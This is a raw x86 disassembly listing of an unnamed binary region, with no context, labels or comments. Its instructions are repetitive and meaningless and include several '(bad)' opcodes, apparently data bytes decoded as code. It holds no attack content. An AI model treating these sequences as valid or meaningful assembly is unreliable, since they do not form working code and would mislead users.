  44a8ee:	inc    DWORD PTR [eax]
  44a8f0:	add    BYTE PTR [edi],ah
  44a8f2:	inc    DWORD PTR [eax]
  44a8f4:	add    BYTE PTR [ecx],ch
  44a8f6:	inc    DWORD PTR [eax]
  44a8f8:	add    BYTE PTR [esi],ah
  44a8fa:	inc    DWORD PTR [eax]
  44a8fc:	add    BYTE PTR [ebx],ah
  44a8fe:	inc    DWORD PTR [eax]
  44a900:	add    BYTE PTR [edx],dl
  44a902:	inc    DWORD PTR [ecx]
  44a904:	add    DWORD PTR [ecx],eax
  44a906:	dec    DWORD PTR [edi]
  44a908:	sub    eax,0x1605ffcd
  44a90d:	jns    0x44a90e
  44a90f:	adc    al,0x25
  44a911:	pop    esp
  44a912:	call   DWORD PTR [ecx]
  44a914:	es pop ebx
  44a916:	call   FWORD PTR [edi]
  44a918:	das    
  44a919:	ins    BYTE PTR es:[edi],dx
  44a91a:	jmp    DWORD PTR [ebx]
  44a91c:	ds mov edi,?
  44a91f:	es push ebx
  44a921:	mov    ch,0xff
  44a923:	or     DWORD PTR [edi],edx
  44a925:	inc    DWORD PTR fs:[ecx]
  44a928:	add    DWORD PTR [eax],eax
  44a92a:	inc    DWORD PTR [eax]
  44a92c:	add    BYTE PTR [edi],bl
  44a92e:	inc    DWORD PTR [eax]
  44a930:	add    BYTE PTR [edi+edi*8],bl
  44a933:	add    BYTE PTR [eax],al
  44a935:	push   ds
  44a936:	inc    DWORD PTR [eax]
  44a938:	add    BYTE PTR [ebx],bl
  44a93a:	inc    DWORD PTR [eax]
  44a93c:	add    BYTE PTR [edi+edi*8],bl
  44a93f:	add    DWORD PTR [ecx],eax
  44a941:	add    bh,bh
  44a943:	pop    ds
  44a944:	jle    0x44a8fd
  44a946:	call   DWORD PTR [edx]
  44a948:	sub    ah,BYTE PTR [edi+edi*8-0x5ad4ee]
  44a94f:	or     eax,0xbff6b1e
  44a954:	adc    edi,DWORD PTR ds:0x4f170cff
  44a95a:	inc    DWORD PTR ds:0x48ffa227
  44a960:	stos   BYTE PTR es:[edi],al
  44a961:	(bad)  
  44a962:	call   DWORD PTR [edx]
  44a964:	es pop esp
  44a966:	inc    DWORD PTR [ecx]
  44a968:	add    DWORD PTR [eax],eax
  44a96a:	inc    DWORD PTR [eax]
  44a96c:	add    BYTE PTR [edi],cl
  44a96e:	inc    DWORD PTR [eax]
  44a970:	add    BYTE PTR [ebx],cl
  44a972:	inc    DWORD PTR [ecx]
  44a974:	add    DWORD PTR [eax],eax
  44a976:	inc    DWORD PTR [ecx]
  44a978:	add    al,BYTE PTR [edx]
  44a97a:	dec    DWORD PTR [ebx+eiz*1]
  44a97d:	mov    eax,ds:0xf91a08ff
  44a982:	inc    DWORD PTR [eax]
  44a984:	adc    eax,0x1c0affc8
  44a989:	(bad)  
  44a98a:	jmp    FWORD PTR ds:0x2affb567
  44a990:	inc    edx
  44a991:	mov    edi,edi
  44a993:	adc    eax,0xbff9c2e
  44a998:	xor    al,0xfb
  44a99a:	inc    DWORD PTR [ecx]
  44a99c:	add    eax,0xff2d
  44a9a1:	or     edi,edi
  44a9a3:	add    BYTE PTR [eax],al
  44a9a5:	sbb    edi,edi
  44a9a7:	add    al,BYTE PTR [ecx]
  44a9a9:	sbb    edi,edi
  44a9ab:	add    BYTE PTR [eax],al
  44a9ad:	push   cs
  44a9ae:	inc    DWORD PTR [ecx]
  44a9b0:	add    DWORD PTR ds:0xe0101ff,ecx
  44a9b6:	inc    DWORD PTR ds:0x1ff0904
  44a9bc:	add    DWORD PTR [eax],eax
  44a9be:	dec    DWORD PTR [eax]
  44a9c0:	rsm    
  44a9c2:	jmp    DWORD PTR ds:0x25ffb946
  44a9c8:	sub    al,0x80
  44a9ca:	jmp    FWORD PTR [edi+ebp*1]
  44a9cd:	jns    0x44a9ce
  44a9cf:	and    ebp,DWORD PTR ds:0x351bff74
  44a9d5:	mov    eax,ds:0xc14c1eff
  44a9da:	jmp    FWORD PTR [ecx]
  44a9dc:	pop    edx
  44a9dd:	(bad)  
  44a9df:	push   es
  44a9e0:	push   cs
  44a9e1:	cmp    bh,0x1
  44a9e4:	add    DWORD PTR [eax],eax
  44a9e6:	inc    DWORD PTR [eax]
  44a9e8:	add    BYTE PTR [eax],ah
  44a9ea:	inc    DWORD PTR [eax]
  44a9ec:	add    BYTE PTR [eax],ah
  44a9ee:	inc    DWORD PTR [eax]
  44a9f0:	add    BYTE PTR [esi],bl
  44a9f2:	inc    DWORD PTR [eax]
  44a9f4:	add    BYTE PTR [edi],bl
  44a9f6:	inc    DWORD PTR [eax]
  44a9f8:	add    BYTE PTR [eax],ah
  44a9fa:	inc    DWORD PTR [eax]
  44a9fc:	add    BYTE PTR [edi+edi*8],ah
  44a9ff:	add    BYTE PTR [eax],al
  44aa01:	pop    ds
  44aa02:	inc    DWORD PTR [ecx]
  44aa04:	add    DWORD PTR [eax],eax
  44aa06:	inc    DWORD PTR [eax]
  44aa08:	or     esp,DWORD PTR [eax-0x1]
  44aa0b:	pop    es
  44aa0c:	sbb    edx,eax
  44aa0e:	dec    DWORD PTR [esi]
  44aa10:	sbb    al,0x7f
  44aa12:	call   DWORD PTR [ebx]
  44aa14:	sub    bh,BYTE PTR [edi-0x1]
  44aa17:	push   ss
  44aa18:	sub    BYTE PTR [edi-0x1],ch
  44aa1b:	pop    ds
  44aa1c:	das    
  44aa1d:	ins    DWORD PTR es:[edi],dx
  44aa1e:	call   FWORD PTR [esi]
  44aa20:	inc    eax
  44aa21:	stos   DWORD PTR es:[edi],eax
  44aa22:	inc    DWORD PTR [ecx]
  44aa24:	add    eax,0x101ff6d
  44aa29:	add    bh,bh
  44aa2b:	add    BYTE PTR [eax],al
  44aa2d:	sbb    eax,0x1c0000ff
  44aa32:	inc    DWORD PTR [eax]
  44aa34:	add    BYTE PTR [ebx],bl
  44aa36:	inc    DWORD PTR [eax]
  44aa38:	add    BYTE PTR [edi],dl
  44aa3a:	inc    DWORD PTR [eax]
  44aa3c:	add    BYTE PTR [ecx],bl
  44aa3e:	inc    DWORD PTR [ecx]
  44aa40:	add    DWORD PTR [eax],eax
  44aa42:	dec    DWORD PTR ds:0x10ff8147
  44aa48:	sub    al,0xcc
  44aa4a:	dec    DWORD PTR [esi]
  44aa4c:	push   ds
  44aa4d:	cdq    
  44aa4e:	call   DWORD PTR [esi+eiz*1]
  44aa51:	cmp    edi,0xff5e2314
  44aa57:	adc    BYTE PTR [eax],ah
  44aa59:	imul   edi,edi,0x5
  44aa5c:	add    eax,0x7a40ff26
  44aa61:	aad    0xff
  44aa63:	push   ss
  44aa64:	sub    dh,BYTE PTR [edx-0x1]
  44aa67:	add    DWORD PTR [ecx],eax
  44aa69:	add    bh,bh
  44aa6b:	add    BYTE PTR [eax],al
  44aa6d:	ud0    eax,DWORD PTR [eax]
  44aa70:	add    BYTE PTR [esi],cl
  44aa72:	inc    DWORD PTR [ecx]
  44aa74:	add    DWORD PTR [eax],eax
  44aa76:	inc    DWORD PTR [edx]
  44aa78:	add    al,BYTE PTR [edx]
  44aa7a:	inc    DWORD PTR [edx]
  44aa7c:	or     BYTE PTR [ebp-0x4aecfb01],dl
  44aa82:	inc    DWORD PTR [esi]
  44aa84:	push   ss
  44aa85:	jns    0x44aa86
  44aa87:	add    DWORD PTR ds:0x1b0effce,ecx
  44aa8d:	jne    0x44aa8e
  44aa8f:	sbb    eax,0x1fff652e
  44aa94:	sub    al,0x61
  44aa96:	call   DWORD PTR [ecx]
  44aa98:	xor    al,0xcf
  44aa9a:	inc    DWORD PTR [eax]
  44aa9c:	add    cl,BYTE PTR ds:0x160000ff
  44aaa2:	inc    DWORD PTR [eax]
  44aaa4:	add    BYTE PTR [edi],dl
  44aaa6:	inc    DWORD PTR [eax]
  44aaa8:	add    BYTE PTR [ebx],bl
  44aaaa:	inc    DWORD PTR [eax]
  44aaac:	add    BYTE PTR [eax],al
  44aaae:	inc    DWORD PTR [ecx]
  44aab0:	add    DWORD PTR [edi],eax
  44aab2:	inc    DWORD PTR [eax]
  44aab4:	add    BYTE PTR ds:0x50000ff,al
  44aaba:	inc    DWORD PTR [eax]
  44aabc:	add    BYTE PTR ds:0x94150bff,al
  44aac2:	jmp    DWORD PTR [ecx]
  44aac4:	sub    al,0x8e
  44aac6:	jmp    DWORD PTR [ecx]
  44aac8:	and    eax,0x2527ff6e
  44aacd:	jmp    FWORD PTR gs:[edi]
  44aad0:	sub    al,0x66
  44aad2:	call   FWORD PTR ds:0x1eff832e
  44aad8:	inc    edi
  44aad9:	mov    eax,0xd7501fff
  44aade:	inc    DWORD PTR [ebx]
  44aae0:	or     DWORD PTR [esi+0x101ff],esi
  44aae6:	inc    DWORD PTR [eax]
  44aae8:	add    BYTE PTR [eax],ah
  44aaea:	inc    DWORD PTR [eax]
  44aaec:	add    BYTE PTR [eax],ah
  44aaee:	inc    DWORD PTR [eax]
  44aaf0:	add    BYTE PTR [eax],ah
  44aaf2:	inc    DWORD PTR [eax]
  44aaf4:	add    BYTE PTR [esi],bl
  44aaf6:	inc    DWORD PTR [eax]
  44aaf8:	add    BYTE PTR [eax],ah
  44aafa:	inc    DWORD PTR [eax]
  44aafc:	add    BYTE PTR [esi],bl
  44aafe:	inc    DWORD PTR [eax]
  44ab00:	add    BYTE PTR [eax],bl
  44ab02:	inc    DWORD PTR [eax]
  44ab04:	add    BYTE PTR [ecx],ah
  44ab06:	dec    DWORD PTR [ecx]
  44ab08:	push   es
  44ab09:	add    bh,bh
  44ab0b:	add    dl,BYTE PTR [esi+esi*2]
  44ab0e:	call   DWORD PTR [ebx]
  44ab10:	cmp    ebp,esp
  44ab12:	call   FWORD PTR [eax]
  44ab14:	xor    BYTE PTR [esi-0x58d0ea01],dl
  44ab1a:	call   DWORD PTR [esi]
  44ab1c:	xor    edx,DWORD PTR [eax-0x6bd8f101]
  44ab22:	inc    DWORD PTR [eax]
  44ab24:	add    BYTE PTR [edi+0x101ff],bl
  44ab2a:	inc    DWORD PTR [eax]
  44ab2c:	add    BYTE PTR [ecx],bl
  44ab2e:	inc    DWORD PTR [eax]
  44ab30:	add    BYTE PTR [esi],bl
  44ab32:	inc    DWORD PTR [eax]
  44ab34:	add    BYTE PTR [edx],bl
  44ab36:	inc    DWORD PTR [eax]
  44ab38:	add    BYTE PTR [eax],bl
  44ab3a:	inc    DWORD PTR [eax]
  44ab3c:	add    BYTE PTR [esi],dl
  44ab3e:	inc    DWORD PTR [ecx]
  44ab40:	add    DWORD PTR [eax],eax
  44ab42:	inc    DWORD PTR [ecx]
  44ab44:	or     DWORD PTR [edi+edi*8],edi
  44ab47:	add    edx,DWORD PTR [ebx]
  44ab49:	pusha  
  44ab4a:	inc    DWORD PTR [eax+ecx*1]
  44ab4d:	inc    edx
  44ab4e:	call   FWORD PTR [ebx+eiz*1]
  44ab51:	jno    0x44ab52
  44ab53:	movups XMMWORD PTR ds:0x7b190eff,xmm6
  44ab5a:	call   FWORD PTR [esi]
  44ab5c:	adc    eax,0x3c33ff37
  44ab61:	call   0x1ff:0xa72d0fff
  44ab68:	add    DWORD PTR [eax],eax
  44ab6a:	inc    DWORD PTR [eax]
  44ab6c:	add    BYTE PTR [esi],cl
  44ab6e:	inc    DWORD PTR [eax]
  44ab70:	add    BYTE PTR [edi],cl
  44ab72:	inc    DWORD PTR [ecx]
  44ab74:	add    DWORD PTR [eax],eax
  44ab76:	dec    DWORD PTR [ecx]
  44ab78:	or     BYTE PTR ds:0xb60d01ff,cl
  44ab7e:	inc    DWORD PTR [edx+edx*1]
  44ab81:	fwait
  44ab82:	call   DWORD PTR [ecx]
  44ab84:	sub    eax,0x1f11ff92
  44ab89:	nop
  44ab8a:	dec    DWORD PTR ds:0x10ffa215
  44ab90:	push   ss
  44ab91:	outs   dx,BYTE PTR ds:[esi]
  44ab92:	call   FWORD PTR [edi+eiz*1]
  44ab95:	push   ebp
  44ab96:	call   DWORD PTR [ebx]
  44ab98:	cs cwde 
  44ab9a:	inc    DWORD PTR [eax]
  44ab9c:	add    BYTE PTR [ebx],al
  44ab9e:	inc    DWORD PTR [eax]
  44aba0:	add    BYTE PTR [ebx],dl
  44aba2:	inc    DWORD PTR [eax]
  44aba4:	add    BYTE PTR [edx],dl
  44aba6:	inc    DWORD PTR [eax]
  44aba8:	add    BYTE PTR [edx],bl
  44abaa:	inc    DWORD PTR [ecx]
  44abac:	add    al,0x1c
  44abae:	inc    DWORD PTR [eax]
  44abb0:	sbb    eax,0x2208ffd6
  44abb5:	enter  0x17ff,0x29
  44abb9:	scas   eax,DWORD PTR es:[edi]
  44abba:	call   DWORD PTR [esi]
  44abbc:	sub    esi,DWORD PTR [edi-0x41d5eb01]
  44abc2:	call   FWORD PTR [ebx+eiz*1]
  44abc5:	xchg   edi,edi
  44abc7:	and    DWORD PTR [eax],esp
  44abc9:	jmp    FWORD PTR fs:[edx]
  44abcc:	es pop ebp
  44abce:	jmp    FWORD PTR [edx]
  44abd0:	sub    ch,BYTE PTR [ecx-0x1]
  44abd3:	sbb    al,0x28
  44abd5:	jle    0x44abd6
  44abd7:	push   ds
  44abd8:	aas    
  44abd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44abda:	call   FWORD PTR [ecx]
  44abdc:	cmp    esi,DWORD PTR [ebp-0x38effc01]
  44abe2:	inc    DWORD PTR [ecx]
  44abe4:	add    DWORD PTR [eax],eax
  44abe6:	inc    DWORD PTR [eax]
  44abe8:	add    BYTE PTR ds:0x220000ff,ah
  44abee:	inc    DWORD PTR [eax]
  44abf0:	add    BYTE PTR [eax],ah
  44abf2:	inc    DWORD PTR [eax]
  44abf4:	add    BYTE PTR [edx],ah
  44abf6:	inc    DWORD PTR [eax]
  44abf8:	add    BYTE PTR [ecx],ah
  44abfa:	inc    DWORD PTR [eax]
  44abfc:	add    BYTE PTR [edx],ah
  44abfe:	inc    DWORD PTR [eax]
  44ac00:	add    BYTE PTR [edi],cl
  44ac02:	inc    DWORD PTR [eax]
  44ac04:	add    DWORD PTR [edx],eax
  44ac06:	inc    DWORD PTR [ebx]
  44ac08:	add    eax,0xff0c
  44ac0d:	add    bh,bh
  44ac0f:	add    al,0x14
  44ac11:	pusha  
  44ac12:	call   FWORD PTR [eax]
  44ac14:	aas    
  44ac15:	(bad)  
  44ac16:	call   DWORD PTR [edi]
  44ac18:	xor    DWORD PTR [ecx-0x1],esi
  44ac1b:	adc    al,0x2c
  44ac1d:	js     0x44ac1e
  44ac1f:	push   es
  44ac20:	sbb    eax,0x100ff80
  44ac25:	mov    bl,0xff
  44ac27:	add    DWORD PTR [ecx],eax
  44ac29:	add    bh,bh
  44ac2b:	add    BYTE PTR [eax],al
  44ac2d:	sbb    edi,edi
  44ac2f:	add    BYTE PTR [eax],al
  44ac31:	sbb    edi,edi
  44ac33:	add    BYTE PTR [eax],al
  44ac35:	sbb    bh,bh
  44ac37:	add    BYTE PTR [eax],al
  44ac39:	sbb    edi,edi
  44ac3b:	add    BYTE PTR [eax],al
  44ac3d:	adc    eax,0x101ff
  44ac42:	inc    DWORD PTR [eax]
  44ac44:	add    BYTE PTR [eax],al
  44ac46:	inc    DWORD PTR [edx]
  44ac48:	adc    al,0x58
  44ac4a:	call   DWORD PTR [ecx]
  44ac4c:	sub    al,0x9c
  44ac4e:	jmp    DWORD PTR [edx+ebp*1]
  44ac51:	popf   
  44ac52:	call   FWORD PTR [ecx]
  44ac54:	push   ds
  44ac55:	jo     0x44ac56
  44ac57:	or     al,0xe
  44ac59:	cmp    bh,bh
  44ac5b:	push   cs
  44ac5c:	add    eax,0x2f28ff12
  44ac61:	mov    edi,edi
  44ac63:	adc    DWORD PTR [edx],esi
  44ac65:	enter  0x1ff,0x1
  44ac69:	add    bh,bh
  44ac6b:	add    BYTE PTR [eax],al
  44ac6d:	push   cs
  44ac6e:	inc    DWORD PTR [eax]
  44ac70:	add    BYTE PTR ds:0x101ff,cl
  44ac76:	inc    DWORD PTR [ecx]
  44ac78:	add    DWORD PTR [eax],eax
  44ac7a:	inc    DWORD PTR [ecx]
  44ac7c:	or     al,cl
  44ac7e:	dec    DWORD PTR [edx]
  44ac80:	and    dh,BYTE PTR [eax-0x4bbee601]
  44ac86:	call   FWORD PTR [esi]
  44ac88:	cmp    BYTE PTR [ebp-0x7cced301],dl
  44ac8e:	call   FWORD PTR [edx]
  44ac90:	push   ds
  44ac91:	nop
  44ac92:	call   FWORD PTR ds:0xbff872b
  44ac98:	and    eax,0x100ffb0
  44ac9d:	or     edi,edi
  44ac9f:	add    BYTE PTR [eax],al
  44aca1:	push   ss
  44aca2:	inc    DWORD PTR [eax]
  44aca4:	add    BYTE PTR [edi],dl
  44aca6:	inc    DWORD PTR [eax]
  44aca8:	add    BYTE PTR [ecx],bl
  44acaa:	inc    DWORD PTR [ecx]
  44acac:	add    DWORD PTR ds:0xea3a06ff,ecx
  44acb2:	jmp    FWORD PTR [eax]
  44acb4:	xor    eax,0x9f5a49ff
  44acba:	jmp    FWORD PTR [eax]
  44acbc:	daa    
  44acbd:	push   eax
  44acbe:	call   FWORD PTR [edx]
  44acc0:	sbb    bl,BYTE PTR [edi-0x1]
  44acc3:	sbb    BYTE PTR [edx],bl
  44acc5:	call   DWORD PTR [ebx]
  44acc8:	sbb    eax,0x2128ff65
  44accd:	pop    ebx
  44acce:	jmp    FWORD PTR ds:0x1dff762b
  44acd4:	xor    DWORD PTR [ecx+0x69230fff],esp
  44acda:	call   DWORD PTR ds:0x7ff922e
  44ace0:	sbb    DWORD PTR [esi+0x101ff],ebp
  44ace6:	inc    DWORD PTR [eax]
  44ace8:	add    BYTE PTR [edi],bl
  44acea:	inc    DWORD PTR [eax]
  44acec:	add    BYTE PTR ds:0x1e0000ff,bl
  44acf2:	inc    DWORD PTR [eax]
  44acf4:	add    BYTE PTR [eax],ah
  44acf6:	inc    DWORD PTR [eax]
  44acf8:	add    BYTE PTR [esi],bl
  44acfa:	inc    DWORD PTR [eax]
  44acfc:	add    BYTE PTR [edi],bl
  44acfe:	inc    DWORD PTR [ecx]
  44ad00:	add    DWORD PTR ds:0x90303ff,eax
  44ad06:	inc    DWORD PTR [esi]
  44ad08:	and    bh,BYTE PTR [edi-0x5de9ff01]
  44ad0e:	inc    DWORD PTR [eax]
  44ad10:	pop    es
  44ad11:	sub    bh,bh
  44ad13:	add    BYTE PTR ds:0x1d0aff29,al
  44ad19:	cwde   
  44ad1a:	call   DWORD PTR [ebp*1+0xf03ff75]
  44ad21:	pop    edi
  44ad22:	inc    DWORD PTR [eax]
  44ad24:	add    DWORD PTR [ebx+0x101ff],ebp
  44ad2a:	inc    DWORD PTR [eax]
  44ad2c:	add    BYTE PTR [edi],dl
  44ad2e:	inc    DWORD PTR [eax]
  44ad30:	add    BYTE PTR ds:0x160000ff,dl
  44ad36:	inc    DWORD PTR [eax]
  44ad38:	add    BYTE PTR [eax],bl
  44ad3a:	inc    DWORD PTR [eax]
  44ad3c:	add    BYTE PTR [ebx],dl
  44ad3e:	inc    DWORD PTR [ecx]
  44ad40:	add    DWORD PTR [eax],eax
  44ad42:	inc    DWORD PTR [eax]
  44ad44:	add    BYTE PTR [edi+edi*8],al
  44ad47:	or     DWORD PTR [ecx],ebp
  44ad49:	mov    ecx,0x8c2911ff
  44ad4e:	call   FWORD PTR [edx]
  44ad50:	sub    eax,0x2621ffa7
  44ad55:	test   bh,bh
  44ad57:	adc    edx,DWORD PTR [esi]
  44ad59:	dec    edi
  44ad5a:	jmp    DWORD PTR ds:0x21ff3519
  44ad60:	sub    BYTE PTR [edi+edi*8-0x3fdaf5],dl
  44ad67:	add    DWORD PTR [ecx],eax
  44ad69:	add    bh,bh
  44ad6b:	add    BYTE PTR [eax],al
  44ad6d:	or     edi,edi
  44ad6f:	add    BYTE PTR [eax],al
  44ad71:	or     edi,edi
  44ad73:	add    DWORD PTR [ecx],eax
  44ad75:	add    bh,bh
  44ad77:	add    DWORD PTR [ecx],eax
  44ad79:	add    bh,bh
  44ad7b:	pop    es
  44ad7c:	sbb    BYTE PTR [ebx-0x3fcfee01],ch
  44ad82:	jmp    DWORD PTR [ebx]
  44ad84:	dec    edi
  44ad85:	sar    bh,0x21
  44ad88:	cmp    ebx,DWORD PTR [esi-0x6ac8d001]
  44ad8e:	jmp    DWORD PTR [edx]
  44ad90:	sbb    eax,0x1512ff59
  44ad95:	jp     0x44ad96
  44ad97:	add    bl,BYTE PTR [ebx]
  44ad99:	(bad)  
  44ad9a:	inc    DWORD PTR [eax]
  44ad9c:	add    dl,BYTE PTR [edx]
  44ad9e:	inc    DWORD PTR [eax]
  44ada0:	add    BYTE PTR [edx],dl
  44ada2:	inc    DWORD PTR [eax]
  44ada4:	add    BYTE PTR ds:0x170000ff,dl
  44adaa:	inc    DWORD PTR [edx]
  44adac:	add    al,BYTE PTR [eax]
  44adae:	inc    DWORD PTR [edx]
  44adb0:	add    eax,0x551fff22
  44adb5:	into   
  44adb6:	call   FWORD PTR [esi]
  44adb8:	sub    eax,0x20bff7d
  44adbd:	adc    edi,edi
  44adbf:	adc    DWORD PTR [esi+eiz*1],ecx
  44adc2:	call   FWORD PTR [eax]
  44adc4:	pop    ss
  44adc5:	push   ecx
  44adc6:	call   DWORD PTR [edx*1+0x2327ff58]
  44adcd:	pop    ecx
  44adce:	jmp    FWORD PTR [edi]
  44add0:	es push edx
  44add2:	dec    DWORD PTR [ebx]
  44add4:	adc    eax,DWORD PTR [edi+edi*8-0x7ad8ef]
  44addb:	adc    ebp,DWORD PTR [edx]
  44addd:	mov    edi,edi
  44addf:	or     ebx,DWORD PTR [edi]
  44ade1:	mov    ebp,0x101ff
  44ade6:	inc    DWORD PTR [eax]
  44ade8:	add    BYTE PTR [esi],bl
  44adea:	inc    DWORD PTR [eax]
  44adec:	add    BYTE PTR [edx],bl
  44adee:	inc    DWORD PTR [eax]
  44adf0:	add    BYTE PTR [esi],bl
  44adf2:	inc    DWORD PTR [eax]
  44adf4:	add    BYTE PTR [ebx],bl
  44adf6:	inc    DWORD PTR [eax]
  44adf8:	add    BYTE PTR [esi],bl
  44adfa:	inc    DWORD PTR [eax]
  44adfc:	add    BYTE PTR ds:0x40100ff,bl
  44ae02:	inc    DWORD PTR [ecx]
  44ae04:	add    cl,BYTE PTR ds:0xe22e0bff
  44ae0a:	call   DWORD PTR [edx]
  44ae0c:	push   edx
  44ae0d:	idiv   edi
  44ae0f:	adc    cl,BYTE PTR [ecx+eiz*8-0x1]
  44ae13:	push   es
  44ae14:	adc    esp,DWORD PTR [esi-0x1]
  44ae17:	add    BYTE PTR [eax],al
  44ae19:	sbb    bh,bh
  44ae1b:	add    DWORD PTR ds:0xd01ffaf,edx
  44ae21:	int3   
  44ae22:	inc    DWORD PTR [eax]
  44ae24:	add    BYTE PTR [eax+0x101ff],ch
  44ae2a:	inc    DWORD PTR [eax]
  44ae2c:	add    BYTE PTR [edi],dl
  44ae2e:	inc    DWORD PTR [eax]
  44ae30:	add    BYTE PTR [ecx],bl
  44ae32:	inc    DWORD PTR [eax]
  44ae34:	add    BYTE PTR [eax],bl
  44ae36:	inc    DWORD PTR [eax]
  44ae38:	add    BYTE PTR [eax],bl
  44ae3a:	inc    DWORD PTR [eax]
  44ae3c:	add    BYTE PTR [esi],dl
  44ae3e:	inc    DWORD PTR [ecx]
  44ae40:	add    DWORD PTR [eax],eax
  44ae42:	inc    DWORD PTR [eax]
  44ae44:	add    ebx,DWORD PTR [ecx]
  44ae46:	dec    DWORD PTR [ecx]
  44ae48:	sbb    ebp,DWORD PTR [eax+0x67160bff]
  44ae4e:	call   FWORD PTR [edx]
  44ae50:	es test bh,bh
  44ae53:	push   ss
  44ae54:	sbb    al,0x79
  44ae56:	call   DWORD PTR [eax]
  44ae58:	adc    eax,DWORD PTR [esi-0x1]
  44ae5b:	sbb    dl,BYTE PTR ds:0x2115ff2e
  44ae61:	nop
  44ae62:	call   DWORD PTR [eax]
  44ae64:	and    al,0xba
  44ae66:	inc    DWORD PTR [ecx]
  44ae68:	add    DWORD PTR [eax],eax
  44ae6a:	inc    DWORD PTR [eax]
  44ae6c:	add    BYTE PTR [edx],cl
  44ae6e:	inc    DWORD PTR [eax]
  44ae70:	add    BYTE PTR [ecx],cl
  44ae72:	inc    DWORD PTR [ecx]
  44ae74:	add    DWORD PTR [eax],eax
  44ae76:	dec    DWORD PTR [ecx]
  44ae78:	or     ah,BYTE PTR [ecx]
  44ae7a:	inc    DWORD PTR [ecx]
  44ae7c:	add    dh,BYTE PTR [esi-0x1]
  44ae7f:	adc    ah,BYTE PTR [ecx]
  44ae81:	mov    edi,edi
  44ae83:	and    eax,0x1effa645
  44ae88:	xor    eax,DWORD PTR [esi-0x76c8d501]
  44ae8e:	jmp    FWORD PTR [edx]
  44ae90:	and    eax,0x1817ff61
  44ae95:	pop    esi
  44ae96:	dec    DWORD PTR [edx]
  44ae98:	sub    eax,ebx
  44ae9a:	inc    DWORD PTR [edi]
  44ae9c:	or     DWORD PTR [ebx],ecx
  44ae9e:	inc    DWORD PTR [eax]
  44aea0:	add    BYTE PTR [edx],dl
  44aea2:	inc    DWORD PTR [eax]
  44aea4:	add    BYTE PTR [ecx],dl
  44aea6:	inc    DWORD PTR [eax]
  44aea8:	add    BYTE PTR [ebx],dl
  44aeaa:	inc    DWORD PTR [ecx]
  44aeac:	add    DWORD PTR [eax],edx
  44aeae:	inc    DWORD PTR [edx]
  44aeb0:	add    al,BYTE PTR [eax]
  44aeb2:	inc    DWORD PTR [edx]
  44aeb4:	add    eax,0x250dff19
  44aeb9:	(bad)  
  44aeba:	call   FWORD PTR [eax]
  44aebc:	adc    al,0x4a
  44aebe:	jmp    FWORD PTR [edx]
  44aec0:	and    BYTE PTR [edi],ch
  44aec2:	jmp    DWORD PTR [ebx+ebx*1]
  44aec5:	sub    eax,0x641817ff
  44aeca:	call   FWORD PTR [ecx]
  44aecc:	sbb    DWORD PTR [esi-0x1],edi
  44aecf:	sub    al,BYTE PTR cs:[ebx-0x1]
  44aed3:	push   ss
  44aed4:	adc    al,BYTE PTR [ebx-0x1]
  44aed7:	adc    eax,0xfff6518
  44aedc:	push   ds
  44aedd:	popa   
  44aede:	inc    DWORD PTR [edi]
  44aee0:	adc    eax,0x101ff9f
  44aee5:	add    bh,bh
  44aee7:	add    BYTE PTR [eax],al
  44aee9:	sbb    edi,edi
  44aeeb:	add    BYTE PTR [eax],al
  44aeed:	sbb    bh,bh
  44aeef:	add    BYTE PTR [eax],al
  44aef1:	sbb    eax,0x1b0000ff
  44aef6:	inc    DWORD PTR [eax]
  44aef8:	add    BYTE PTR [edx],bl
  44aefa:	inc    DWORD PTR [eax]
  44aefc:	add    BYTE PTR [ecx],bl
  44aefe:	inc    DWORD PTR [ecx]
  44af00:	add    DWORD PTR [ebx],eax
  44af02:	inc    DWORD PTR [eax]
  44af04:	add    BYTE PTR [ecx],cl
  44af06:	dec    DWORD PTR [edi]
  44af08:	xor    eax,edx
  44af0a:	call   FWORD PTR [edi]
  44af0c:	xor    ch,BYTE PTR [edi-0x1]
  44af0f:	sbb    BYTE PTR [esi],bl
  44af11:	aaa    
  44af12:	call   DWORD PTR [ebx]
  44af14:	pop    ds
  44af15:	imul   edi,edi,0x9
  44af18:	and    BYTE PTR [ecx+0x3a0801ff],bl
  44af1e:	call   DWORD PTR [edx]
  44af20:	and    al,0xd1
  44af22:	call   DWORD PTR [ecx]
  44af24:	and    edx,ecx
  44af26:	inc    DWORD PTR [ecx]
  44af28:	add    DWORD PTR [eax],eax
  44af2a:	inc    DWORD PTR [eax]
  44af2c:	add    BYTE PTR [esi],dl
  44af2e:	inc    DWORD PTR [eax]
  44af30:	add    BYTE PTR [ebx],dl
  44af32:	inc    DWORD PTR [eax]
  44af34:	add    BYTE PTR [ebx],dl
  44af36:	inc    DWORD PTR [eax]
  44af38:	add    BYTE PTR [esi],dl
  44af3a:	inc    DWORD PTR [eax]
  44af3c:	add    BYTE PTR [edi+edi*8],dl
  44af3f:	add    DWORD PTR [ecx],eax
  44af41:	add    bh,bh
  44af43:	add    DWORD PTR [ebx],eax
  44af45:	adc    bh,bh
  44af47:	or     dl,BYTE PTR [eax]
  44af49:	imul   edi,edi,0xc
  44af4c:	adc    bl,BYTE PTR [edi+edi*8+0x13]
  44af50:	sbb    al,0x7f
  44af52:	call   DWORD PTR ds:0x10ff731a
  44af58:	push   ss
  44af59:	push   ecx
  44af5a:	call   DWORD PTR [esi]
  44af5c:	adc    edi,DWORD PTR [edx]
  44af5e:	call   FWORD PTR ds:0xfff7322
  44af64:	and    al,0xd3
  44af66:	inc    DWORD PTR [ecx]
  44af68:	add    DWORD PTR [eax],eax
  44af6a:	inc    DWORD PTR [eax]
  44af6c:	add    BYTE PTR [ebx],cl
  44af6e:	inc    DWORD PTR [eax]
  44af70:	add    BYTE PTR [ecx],cl
  44af72:	inc    DWORD PTR [ecx]
  44af74:	add    DWORD PTR [eax],eax
  44af76:	inc    DWORD PTR [ebx]
  44af78:	or     DWORD PTR [edi],edi
  44af7a:	inc    DWORD PTR [ecx]
  44af7c:	or     BYTE PTR [edx-0x1],ch
  44af7f:	adc    esp,DWORD PTR [ecx]
  44af81:	pop    edx
  44af82:	jmp    DWORD PTR [esi+edi*1]
  44af85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44af86:	call   FWORD PTR [esi]
  44af88:	xor    eax,0x382cff8d
  44af8d:	test   bh,bh
  44af8f:	sbb    bl,BYTE PTR ds:0x1c1bff92
  44af95:	jno    0x44af96
  44af97:	pop    es
  44af98:	sbb    al,0xa7
  44af9a:	inc    DWORD PTR [esi]
  44af9c:	push   es
  44af9d:	pop    es
  44af9e:	inc    DWORD PTR [eax]
